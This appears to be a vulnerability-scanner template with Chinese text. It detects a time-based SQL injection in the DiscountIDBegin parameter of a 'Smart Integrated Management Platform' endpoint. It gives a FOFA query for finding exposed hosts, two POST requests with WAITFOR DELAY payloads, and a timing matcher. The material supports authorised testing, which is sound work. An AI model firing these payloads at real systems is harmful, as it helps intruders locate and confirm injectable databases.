id: ZhiHui-ZongHe-GuanLi-PingTai-DDiscountDevices_ashx-SQL-Time

info:
  name: 智慧综合管理平台 /Module/SBXX/Controller/DDiscountDevices.ashx SQL延时注入
  author: HuanXiong
  severity: high
  description: |-
    fofa: title="智慧综合管理平台登入"
    智慧综合管理平台 /Module/SBXX/Controller/DDiscountDevices.ashx 接口存在SQL延时注入漏洞，攻击者可通过DiscountIDBegin参数注入SQL语句进行延时攻击，可能导致数据库信息泄露、服务器被入侵等安全风险。
  reference:
    - 
  tags: sql-time, zhihui-zongheguanlipingtai, module-sbxx-controller-ddiscountdevices

http:
  - raw:
      - |-
        POST /Module/SBXX/Controller/DDiscountDevices.ashx HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Content-Type: application/x-www-form-urlencoded
        Connection: close

        action=find&DiscountIDBegin=1;WAITFOR+DELAY+'0:0:4'--

      - |-
        POST /Module/SBXX/Controller/DDiscountDevices.ashx HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Content-Type: application/x-www-form-urlencoded
        Connection: close

        action=find&DiscountIDBegin=1;WAITFOR+DELAY+'0:0:8'--

    matchers:
      - type: dsl
        name: SQL延时注入
        dsl:
          - "status_code==200 && duration_1>=4 && duration_1<=5 && duration_2>=8 && duration_2<=9"